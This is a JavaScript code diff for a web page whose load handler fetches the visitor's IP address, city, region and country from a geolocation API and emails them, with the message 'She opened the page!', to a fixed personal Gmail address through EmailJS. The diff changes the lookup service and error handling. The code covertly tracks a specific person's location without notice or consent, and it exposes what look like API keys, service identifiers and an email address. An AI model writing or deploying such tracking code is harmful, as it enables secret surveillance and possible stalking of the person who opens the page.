@@ -177,27 +177,29 @@ function animateModel() {
 document.addEventListener("DOMContentLoaded", function () {
     emailjs.init("g68cD0jfv_Qzhryze"); // Your Public Key
 
-    fetch("https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN") // Get IP Info
+    fetch("https://api.ipapi.com/api/check?access_key=74f5e65603453e7613d1b14604624d8d") // Replace with your API key
         .then(response => response.json())
         .then(data => {
             let templateParams = {
-                to_email: "techpc.u2005@gmail.com", // Your Email
+                to_email: "techpc.u2005@gmail.com",
                 message: `She opened the page! 
                 IP: ${data.ip} 
                 City: ${data.city} 
-                Region: ${data.region} 
-                Country: ${data.country}`
+                Region: ${data.region_name} 
+                Country: ${data.country_name}`
             };
 
             emailjs.send("service_sklywbd", "template_qy6e6za", templateParams)
                 .then(function(response) {
                     console.log("Email sent!", response);
-                }, function(error) {
+                })
+                .catch(function(error) {
                     console.log("Failed to send email", error);
                 });
         })
         .catch(error => console.log("Failed to get IP info", error));
 });
+
 
 
 
